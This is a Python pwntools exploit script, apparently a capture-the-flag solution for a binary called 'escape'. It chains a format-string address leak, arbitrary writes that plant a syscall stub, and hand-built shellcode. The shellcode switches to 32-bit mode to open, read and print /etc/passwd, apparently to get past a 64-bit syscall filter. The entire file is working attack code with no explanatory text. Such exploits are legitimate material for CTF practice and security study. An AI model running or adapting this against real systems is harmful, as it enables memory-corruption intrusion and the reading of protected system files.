# -- coding: utf-8 --
from pwn import *

# ENV
PORT = 2682
HOST = "0"
e = context.binary = ELF('./escape')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = e.process()
    # pause()

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
se = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
ru = lambda x : p.recvuntil(x)
rl = lambda: p.recvline()
rec = lambda x : p.recv(x)

# VARIABLE


# PAYLOAD

payload = "%27$p-%29$p-%31$p-"
sla("Enter: \n", payload)
ru("Entered: ")
lib.address = int(ru("-")[:-1], 16) - 0x29d90
e.address = int(ru("-")[:-1], 16) - 0x1509
ret_addr = int(ru("-")[:-1], 16) - 0x110
log.info("base libc: %#x" %lib.address)
log.info("PIE: %#x" %e.address)
log.info("ret address: %#x" %ret_addr)
base_address = ret_addr+0x110
#61

shellcode_area = 0x50510000

write = {
    base_address : shellcode_area,
}
payload = fmtstr_payload(8, write, write_size='short')
sla("Enter: \n", payload)

write = {
    shellcode_area : b"\x31\xff\xbe\x14\x00\x51\x50",
}
payload = fmtstr_payload(8, write, write_size='short')
sla("Enter: \n", payload)

write = {
    base_address : shellcode_area+7,
}
payload = fmtstr_payload(8, write, write_size='short')
sla("Enter: \n", payload)

write = {
    shellcode_area+7 : b"\xba\x00\x05\x00\x00\x31\xc0",
}
payload = fmtstr_payload(8, write, write_size='short')
sla("Enter: \n", payload)

write = {
    base_address : shellcode_area+14,
}
payload = fmtstr_payload(8, write, write_size='short')
sla("Enter: \n", payload)

write = {
    shellcode_area+14 : b"\x0f\x05",
}
payload = fmtstr_payload(8, write, write_size='short')
sla("Enter: \n", payload)
sla("Enter: \n", "doneaaaaaaa")

shellcode = b"\x48\xc7\xc4\x14\x00\x51\x50\x67\xc7\x44\x24\x04\x23\x00\x00\x00\x67\xc7\x04\x24\x2d\x00\x51\x50\xcb"
string_flag = 0x4500 + e.address
shellcode_execve_32 = asm('''
xor  eax, eax
cdq  
push rax

push 0x647773
push 0x7361702f
push 0x6374652f

mov  ebx, esp
xor ecx, ecx
xor edx, edx
mov eax, 5
int 0x80

mov ebx, eax
mov ecx, 0x50510100
mov edx, 0x100
mov eax, 0x3
int 0x80

mov ebx, 1
mov ecx, 0x50510100
mov edx, 0x100
mov eax, 0x4
int 0x80 
                          

''')
shellcode += shellcode_execve_32
pause()
sl(shellcode)
p.interactive()
# push 0x67616c6664 77 73 73 61 70 2f 63 74 65 2f